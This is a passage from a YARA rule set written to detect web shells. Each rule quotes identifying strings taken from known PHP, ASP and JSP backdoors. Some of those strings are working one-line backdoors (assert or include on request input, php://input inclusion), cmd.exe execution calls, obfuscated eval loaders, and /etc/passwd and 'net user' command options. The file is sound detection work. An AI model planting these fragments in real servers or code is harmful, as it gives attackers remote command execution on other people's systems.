      date = "2014-01-28 11:06:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &" 
      $s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-" 
   condition: 
      all of them
}

rule Webshell_php_2_RID2C7F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:51:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php assert($_REQUEST[\"c\"]);?> " fullword
   condition: 
      all of them
}

rule Webshell_asp_cmdasp_RID2EC1 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cmdasp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:28:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
      $s7 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
   condition: 
      all of them
}

rule Webshell_spjspshell_RID2EEE : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file spjspshell.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:35:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:" 
   condition: 
      all of them
}

rule Webshell_jsp_action_RID2ED0 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file action.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:30:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword
      $s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>" fullword
   condition: 
      all of them
}

rule Webshell_Inderxer_RID2DE7 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Inderxer.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:51:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ" 
   condition: 
      all of them
}

rule Webshell_asp_Rader_RID2E37 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Rader.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:05:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0" 
      $s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 " 
   condition: 
      all of them
}

rule Webshell_c99_madnet_smowu_RID30ED : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file smowu.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:00:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "//Authentication" fullword
      $s1 = "$login = \"" fullword
      $s2 = "eval(gzinflate(base64_decode('" 
      $s4 = "//Pass" 
      $s5 = "$md5_pass = \"" 
      $s6 = "//If no pass then hash" 
   condition: 
      all of them
}

rule Webshell_minupload_RID2E6F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file minupload.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:14:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword
      $s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859" 
   condition: 
      all of them
}

rule Webshell_PHP_bug_1__RID2E1A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file bug (1).php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:00:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@include($_GET['bug']);" fullword
   condition: 
      all of them
}

rule Webshell_caidao_shell_hkmjj_RID31F1 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file hkmjj.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:44:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  " fullword
   condition: 
      all of them
}

rule Webshell_jsp_asd_RID2D8A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file asd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:36:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword
      $s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url" 
   condition: 
      all of them
}

rule Webshell_metaslsoft_RID2EE8 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file metaslsoft.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:34:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t" 
   condition: 
      all of them
}

rule Webshell_asp_Ajan_RID2DC3 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Ajan.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:45:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate" 
   condition: 
      all of them
}

rule Webshell_h4ntu_shell_powered_by_tsoi__RID361C : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file h4ntu shell powered by tsoi.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 16:41:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b" 
      $s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui" 
      $s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= " 
      $s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($" 
   condition: 
      all of them
}

rule Webshell_PHP_a_RID2C4E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file a.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:43:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"" 
      $s2 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>" 
      $s4 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword
   condition: 
      2 of them
}

rule Webshell_Jspspyweb_RID2E6D : DEMO SCRIPT T1112 T1505_003 T1543_003 WEBSHELL {
   meta:
      description = "Web Shell - file Jspspyweb.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:14:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1112, T1505_003, T1543_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7" 
      $s3 = "  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control" 
   condition: 
      all of them
}

rule Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_RID3866 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 18:19:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n" 
      $s1 = "Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color" 
   condition: 
      1 of them
}

rule Webshell_SimAttacker_Vrsion_1_0_0_priv8_4_My_friend_RID3A73 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 19:47:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo" 
      $s3 = "fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim" 
   condition: 
      1 of them
}

rule Webshell_jsp_12302_RID2D4A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 12302.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:25:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "</font><%out.print(request.getRealPath(request.getServletPath())); %>" fullword
      $s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword
      $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"" 
   condition: 
      all of them
}

rule Webshell_asp_cmd_RID2D7D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cmd.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
      $s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
      $s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
   condition: 
      1 of them
}

rule Webshell_php_up_RID2D32 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file up.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:21:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);" fullword
      $s3 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {" fullword
      $s8 = "echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];" fullword
   condition: 
      2 of them
}

rule Webshell_phpshell3_RID2E39 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file phpshell3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:05:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];" 
      $s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna" 
      $s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword
   condition: 
      2 of them
}

rule Webshell_B374kPHP_B374k_RID2E83 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file B374k.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:17:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Http://code.google.com/p/b374k-shell" fullword
      $s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'" 
      $s3 = "Jayalah Indonesiaku & Lyke @ 2013" fullword
      $s4 = "B374k Vip In Beautify Just For Self" fullword
   condition: 
      1 of them
}

rule Webshell_phpkit_1_0_odd_RID2FEB : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file odd.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:17:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "include('php://input');" fullword
      $s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword
      $s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
   condition: 
      all of them
}

rule Webshell_jsp_123_RID2CE8 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 123.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:09:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7" 
      $s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"" 
      $s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword
   condition: 
      all of them
}

rule Webshell_ASP_tool_RID2DA7 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file tool.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:41:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\"" 
      $s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" " 
      $s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas" 
   condition: 
      2 of them
}

rule Webshell_phpkit_0_1a_odd_RID304C : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file odd.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:33:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "include('php://input');" fullword
      $s3 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
      $s4 = "// uses include('php://input') to execute arbritary code" fullword
      $s5 = "// php://input based backdoor" fullword
   condition: 
      2 of them
}

rule Webshell_PHP_Shell_x3_RID2EEF : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file PHP Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:35:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[" 
      $s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input" 
      $s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset(" 
   condition: 
      2 of them
}

rule Webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_RID41E9 : DEMO EXPLOIT SCRIPT T1087_001 T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 01:05:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, SCRIPT, T1087_001, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
   condition: 
      all of them
}

rule Webshell_Macker_s_Private_PHPShell_RID3444 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Macker's Private PHPShell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:23:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n" 
      $s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[" 
      $s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=" 
   condition: 
      all of them
}

rule Webshell_jsp_list_RID2E0E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file list.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:58:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
      $s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn" 
      $s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword
   condition: 
      all of them
}

rule Webshell_jsp_sys3_RID2DE4 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file sys3.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:51:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword
      $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"" 
      $s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword
   condition: 
      all of them
}

rule Webshell_php_ghost_RID2E72 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ghost.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:14:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'" 
      $s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***" 
      $s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"" fullword
   condition: 
      all of them
}

rule Webshell_r57_1_4_0_RID2D36 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file r57.1.4.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:22:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "@ini_set('error_log',NULL);" fullword
      $s6 = "$pass='abcdef1234567890abcdef1234567890';" fullword
      $s7 = "@ini_restore(\"disable_functions\");" fullword
      $s9 = "@ini_restore(\"safe_mode_exec_dir\");" fullword
   condition: 
      all of them
}

rule Webshell_php_moon_RID2E06 : DEMO SCRIPT T1087_002 T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file moon.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:56:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1087_002, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo '<option value=\"create function backshell returns string soname" 
      $s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\"" 
      $s8 = "echo '<option value=\"select cmdshell(\\'net user " 
   condition: 
      2 of them
}

rule Webshell_ELMALISEKER_Backd00r_RID30DA : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ELMALISEKER Backd00r.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:57:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio" 
      $s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req" 
   condition: 
      all of them
}

rule Webshell_config_myxx_zend_RID3161 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files config.jsp, myxx.jsp, zend.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:20:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e0354099bee243702eb11df8d0e046df"
      hash2 = "591ca89a25f06cf01e4345f98a22845c"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');" 
   condition: 
      all of them
}

rule Webshell_browser_201_3_ma_download_RID3412 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:14:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a7e25b8ac605753ed0c438db93f6c498"
      hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
      hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a" 
      $s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith" 
   condition: 
      all of them
}

rule Webshell_itsec_itsecteam_shell_jHn_RID34D2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files itsec.php, itsecteam_shell.php, jHn.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:46:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "bd6d3b2763c705a01cc2b3f105a25fa4"
      hash2 = "40c6ecf77253e805ace85f119fe1cebb"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b" 
      $s5 = "echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'" 
   condition: 
      all of them
}

rule Webshell_Ghost_Icesword_Silic_RID329D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files ghost_source.php, icesword.php, silic.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:12:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6e20b41c040efb453d57780025a292ae"
      hash2 = "437d30c94f8eef92dc2f064de4998695"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $" 
      $s6 = "if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST[" 
   condition: 
      all of them
}

rule Webshell_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_spy2009_m_ma3_xxx_RID3F1D : DEMO SCRIPT T1012 T1505_003 T1543_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 23:06:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "059058a27a7b0059e2c2f007ad4675ef"
      hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
      hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
      tags = "DEMO, SCRIPT, T1012, T1505_003, T1543_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype=" 
      $s9 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T" 
   condition: 
      all of them
}

rule Webshell_2_520_job_ma1_ma4_2_RID30B8 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:51:51"
      score = 70
      customer = "demo"
